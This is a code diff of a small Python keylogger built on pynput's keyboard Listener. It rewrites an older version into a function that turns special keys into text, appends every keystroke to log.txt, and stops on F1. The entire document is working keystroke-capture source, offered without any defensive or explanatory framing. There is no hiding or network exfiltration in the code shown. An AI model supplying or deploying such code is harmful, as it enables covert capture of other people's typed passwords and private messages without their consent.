@@ -1,39 +1,41 @@
-import pynput
+from pynput.keyboard import Listener
 
-from pynput.keyboard import Key, Listener
+def write_to_file(key):
+    letter = str(key)
+    letter = letter.replace("'", "")
 
-count = 0
-keys = []
+    if letter == 'Key.space':
+        letter = ' '
+    if letter == 'Key.backspace':
+        letter = ''
+    if letter == 'Key.delete':
+        letter = ''    
+    if letter == 'Key.shift':
+        letter = '' 
+    if letter == 'Key.shift_r':
+        letter = ''
+    if letter == 'Key.shift_l':
+        letter = ''        
+    if letter == 'Key.tab':
+        letter = ''      
+    if letter == 'Key.esc':
+        letter = ''      
+    if letter == "Key.ctrl_l":
+        letter = ''
+    if letter == "Key.ctrl_r":
+        letter = ''
+    if letter == "Key.f1":
+        return False  
+    if letter == "Key.enter":
+        letter = "\n"
+    if letter == "Key.alt_l":
+        letter = ''    
+    if letter == "Key.alt_r":
+        letter = ''      
 
-def on_press(key):
-        global keys, count
+    with open("log.txt", 'a') as f:
+        f.write(letter)
 
 
-        keys.append(key)
-        count += 1
-        # print("{0} pressed".format(key))
-
-        if count > 0:
-                count = 0
-                write(str(keys))
-                keys = []
-
-def on_release(key):
-        if key == Key.esc:
-                return False
-
-def write(keys):
-        with open("log.txt", "a") as f:
-                for key in keys: 
-                        k = str(key).replace("'","")
-                        k = k.replace("[","")
-                        k = k.replace("]","") 
-                                
-                        if k.find("space") > 0: 
-                                f.write('\n')
-
-                        elif k.find("Key") == -1:                   
-                                f.write(k)
-                  
-with Listener(on_press=on_press, on_release=on_release) as Listener:
-        Listener.join()   
+with Listener(on_press=write_to_file) as l:
+    l.join()
